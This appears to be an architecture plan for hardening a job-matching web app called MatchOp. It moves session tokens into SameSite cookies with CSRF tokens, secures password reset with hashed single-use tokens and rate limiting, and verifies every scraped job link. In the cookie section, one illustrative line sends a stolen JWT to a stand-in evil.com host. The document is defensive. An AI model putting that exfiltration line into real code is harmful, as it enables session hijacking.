# MatchOp Security Hardening — Architecture Plan

## Executive Summary

Three critical vulnerabilities identified in the MatchOp PRD have been remediated:

| # | Vulnerability | Risk Level | Fix |
|---|---|---|---|
| 1 | JWT stored in `localStorage` | **CRITICAL** | Cookie-based storage with SameSite=Strict + CSRF tokens |
| 2 | Weak password reset flow | **HIGH** | Single-use tokens, 15-min expiry, rate limiting middleware |
| 3 | 30% link sampling → dead links | **MEDIUM** | 100% async HEAD verification via Edge Function |

---

## 1. Cookie-Based Session Management

### Problem
Sessions were stored in `window.localStorage` via the Supabase client config. Any XSS vulnerability (injected script, compromised dependency) could exfiltrate the JWT:

```js
// BEFORE — Vulnerable
storage: window.localStorage,
storageKey: 'matchop-auth-token'
```

An attacker script: `fetch('https://evil.com/steal?token=' + localStorage.getItem('matchop-auth-token'))`

### Architecture

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────┐
│   Browser     │────▶│ Cookie Storage  │────▶│  Supabase    │
│   (React SPA) │     │  Adapter        │     │  GoTrue      │
│               │     │                 │     │              │
│ onAuthState   │◀────│ Secure Cookie   │◀────│ JWT + Refresh│
│ Change()      │     │ SameSite=Strict │     │              │
│ (in-memory)   │     │ + CSRF Token    │     │              │
└──────────────┘     └─────────────────┘     └──────────────┘
```

### Files Changed

| File | Change |
|---|---|
| `src/lib/cookieStorage.js` | **NEW** — Cookie storage adapter implementing `getItem`/`setItem`/`removeItem` + CSRF token utilities |
| `src/lib/supabase.js` | **MODIFIED** — Replaced `window.localStorage` with `cookieStorage`, enabled PKCE flow |
| `src/context/AuthContext.jsx` | **MODIFIED** — CSRF token init on sign-in, `clearAuthCookies()` on sign-out |

### How the SPA Flow Is Maintained
The SPA never reads the cookie directly for auth state. Instead:
1. Supabase JS client uses the cookie adapter for **persistence only**
2. `onAuthStateChange()` listener provides **in-memory** auth state to React context
3. Components read `useAuth()` context (user, profile, isLoggedIn) — no cookie parsing
4. PKCE flow replaces implicit flow for OAuth + password reset redirects

### Cookie Attributes
| Attribute | Value | Purpose |
|---|---|---|
| `SameSite` | `Strict` | Prevents cross-origin cookie sending (CSRF Layer 1) |
| `Secure` | `true` (HTTPS) | Cookies only sent over encrypted connections |
| `Path` | `/` | Available to all routes in the SPA |
| `Max-Age` | 7 days | Session lifetime, refreshed automatically by Supabase |

### CSRF Protection (Defense in Depth)
Even with `SameSite=Strict`, a dedicated CSRF token provides a second layer:
- Token generated via `crypto.getRandomValues(new Uint8Array(32))` — 256-bit entropy
- Stored in a separate readable cookie (`matchop-csrf-token`)
- Must be sent as `X-CSRF-Token` header on state-changing requests
- Constant-time comparison to prevent timing attacks

---

## 2. Secure Password Reset Flow

### Problem
The original flow used Supabase Auth's built-in `resetPasswordForEmail()` directly from the client:
- No rate limiting — an attacker could spam reset emails (email bombing)
- Tokens were managed entirely by Supabase GoTrue (single-use but client had no control)
- No server-side validation layer — the SPA directly called `updateUser({ password })`

### Architecture

```
┌──────────┐  1. Email   ┌──────────────────┐  2. Hash+Store  ┌──────────┐
│  Client   │───────────▶│ Edge Function     │────────────────▶│ Supabase │
│  (React)  │            │ secure-password-  │                 │ DB Table │
│           │            │ reset             │                 │ password_│
│           │            │                   │                 │ reset_   │
│  3. Click │            │ • Rate limiting   │                 │ tokens   │
│  email    │            │ • SHA-256 hashing │                 │          │
│  link     │            │ • 15-min TTL      │                 │ Columns: │
│           │            │ • Single-use      │                 │ token_hash│
│  4. POST  │───────────▶│ • Timing-safe     │  5. updateUser  │ expires_at│
│  new pass │            │   comparison      │────────────────▶│ used     │
│           │◀───────────│                   │                 │ ip_addr  │
│  6. Done  │            └──────────────────┘                 └──────────┘
└──────────┘
```

### Files Created/Changed

| File | Change |
|---|---|
| `supabase/functions/secure-password-reset/index.ts` | **NEW** — Edge Function with 3 endpoints |
| `database/password_reset_tokens.sql` | **NEW** — Token storage table + RLS + cleanup function |
| `src/lib/passwordReset.js` | **NEW** — Client-side API for the Edge Function |
| `src/pages/ForgotPassword.jsx` | **MODIFIED** — Uses `requestPasswordReset()` instead of direct Supabase call |
| `src/pages/ResetPassword.jsx` | **MODIFIED** — Token-based validation instead of session-based |
| `middleware.js` | **NEW** — Vercel Edge Middleware for IP-based rate limiting |
| `vercel.json` | **MODIFIED** — Added security headers |

### Token Security Properties
| Property | Implementation |
|---|---|
| **Entropy** | `crypto.getRandomValues(32 bytes)` = 256-bit CSPRNG |
| **Storage** | SHA-256 hash in DB — plaintext token never persisted |
| **Single-use** | `used` flag set to `true` BEFORE password update |
| **TTL** | 15 minutes, enforced by `expires_at` column in queries |
| **Rate limiting** | 3 requests/email/hour (server), 5 requests/IP/15min (middleware) |
| **Enumeration prevention** | Always returns success, even for non-existent emails |
| **Timing safety** | Constant-time comparison via `timingSafeEqual()` |

### Rate Limiting Layers

| Layer | Scope | Limit | Implementation |
|---|---|---|---|
| Vercel Edge Middleware | IP + path | 5 reqs / 15 min | `middleware.js` in-memory sliding window |
| Edge Function | Email | 3 reqs / 1 hour | DB COUNT query on `password_reset_tokens` |

---

## 3. Dead Link Verification Worker

### Problem
The crawler (`kernel.js`) only verified **30% of links** via a random sampling method:
```js
const shouldVerify = Math.random() < 0.3 // Verify 30% of links
```
This meant ~70% of scraped job links were saved without any verification, causing dead links (404, expired, removed) to proliferate in the `external_jobs` table.

### Architecture

```
Two verification paths:

A) Inline (kernel.js — during scraping)           B) Background (Edge Function — scheduled)
   ┌─────────┐ scrape ┌──────────┐ HEAD ┌────┐      ┌─────────┐ cron  ┌──────────┐ HEAD ┌────┐
   │ kernel  │───────▶│ 100% of  │─────▶│URL │      │Supabase │──────▶│link-     │─────▶│URL │
   │ .js     │        │ new links│      │    │      │pg_cron  │       │checker   │      │    │
   └─────────┘        └──────────┘      └────┘      └─────────┘       │Edge Fn   │      └────┘
                                                                       └──────────┘
C) Manual / CI (Node.js script)
   ┌─────────┐ run    ┌──────────┐ HEAD ┌────┐
   │npm run  │───────▶│check-    │─────▶│URL │
   │scrape:  │        │links-    │      │    │
   │check-   │        │local.js  │      └────┘
   │links    │        └──────────┘
   └─────────┘
```

### Files Created/Changed

| File | Change |
|---|---|
| `supabase/functions/link-checker/index.ts` | **NEW** — Edge Function: async HEAD verification with concurrency control |
| `scripts/crawler/check-links-local.js` | **NEW** — Standalone Node.js script for local/CI execution |
| `scripts/crawler/kernel.js` | **MODIFIED** — `verifyJobLink()` now does 100% HEAD verification |
| `package.json` | **MODIFIED** — Added `scrape:check-links` script |

### Why HEAD > GET
| Metric | HEAD Request | GET Request (Scrapestack) |
|---|---|---|
| Bandwidth | ~1 KB (headers only) | ~50-500 KB (full page + JS rendering) |
| Latency | ~200-500ms | ~2-5s (Scrapestack proxy + rendering) |
| API cost | Free (direct) | Scrapestack API credits |
| Coverage | 100% of links | 30% random sample |
| Body analysis | Falls back to GET only when needed | Always downloads full page |

### Concurrency Model
```
Semaphore-based: max 10 concurrent HEAD requests
┌───────────────────────────────────┐
│ URL Queue: [url1, url2, ... urlN] │
├───────────────────────────────────┤
│ Worker Pool (concurrency=10)      │
│ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐            │
│ │1│ │2│ │3│ │4│ │5│ ...          │
│ └─┘ └─┘ └─┘ └─┘ └─┘            │
├───────────────────────────────────┤
│ Results Map: url → {alive, code}  │
└───────────────────────────────────┘
```

---

## Integration Notes

### Environment Variables Required
No new env vars needed. All existing variables (`VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY`, `VITE_SUPABASE_SERVICE_ROLE_KEY`) are reused.

The Edge Functions use Supabase's built-in `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` secrets (auto-injected).

### Database Migration
Run `database/password_reset_tokens.sql` to create the token storage table.

### Deployment Order
1. Deploy `database/password_reset_tokens.sql` via Supabase SQL Editor
2. Deploy Edge Functions: `supabase functions deploy secure-password-reset` and `supabase functions deploy link-checker`
3. Deploy frontend (Vercel auto-detects `middleware.js`)
4. Verify: test password reset flow end-to-end
5. Schedule link checker: configure pg_cron or Vercel Cron to invoke `/functions/v1/link-checker` daily
